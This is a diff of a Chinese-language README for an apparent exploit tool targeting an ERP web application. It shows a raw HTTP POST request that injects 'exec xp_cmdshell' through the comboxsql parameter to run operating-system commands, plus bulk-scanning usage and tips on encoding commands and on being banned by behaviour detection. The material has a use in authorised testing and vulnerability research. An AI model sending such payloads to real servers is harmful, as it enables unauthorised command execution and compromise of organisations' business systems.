@@ -14,7 +14,7 @@ python3 QiwangERP_RCE.py -f url.txt 批量检测
 
 将脚本流量转发到burp
 
-修改exec参数执行其他命令
+修改comboxsql参数执行其他命令
 ```
 POST /mainFunctions/comboxstore.action HTTP/1.1
 Host: 
@@ -30,8 +30,10 @@ comboxsql=exec%20xp_cmdshell%20'net+user'
 ![](./exp.jpg)
 
 tips:
-1、命令中的空格需要url编码或者用 + 等符号替换
-2、如果一开始可以执行命令到后边突然执行不了了大概率是被行为检测到给ban了
+
+1、命令中的空格需要url编码或者用 + 等符号替换；
+
+2、如果一开始可以执行命令到后边突然执行不了了大概率是被行为检测到给ban了。
 
 ## 免责声明
 
